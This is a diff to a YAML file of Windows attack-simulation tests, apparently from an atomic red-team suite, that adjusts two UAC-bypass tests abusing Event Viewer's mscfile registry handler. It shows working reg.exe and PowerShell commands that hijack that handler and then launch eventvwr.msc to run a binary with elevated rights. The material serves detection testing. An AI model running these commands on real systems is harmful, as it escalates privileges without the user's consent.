@@ -16,14 +16,13 @@ atomic_tests:
     executable_binary:
       description: Binary to execute with UAC Bypass
       type: path
-      default: C:\Windows\System32\cmd.exe
+      default: C:\Windows\System32\notepad.exe
 
   executor:
-    name: command_prompt
+    name: powershell
     command: |
       reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "#{executable_binary}" /f
-      cmd.exe /c eventvwr.msc
-
+      eventvwr.msc
 - name: Bypass UAC using Event Viewer - PowerShell
   uuid: 3db995a1-ef10-4c4e-b27f-7908712cecad
 
@@ -40,7 +39,7 @@ atomic_tests:
       default: C:\Windows\System32\cmd.exe
 
   executor:
-    name: command_prompt
+    name: powershell
     command: |
       New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
       Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
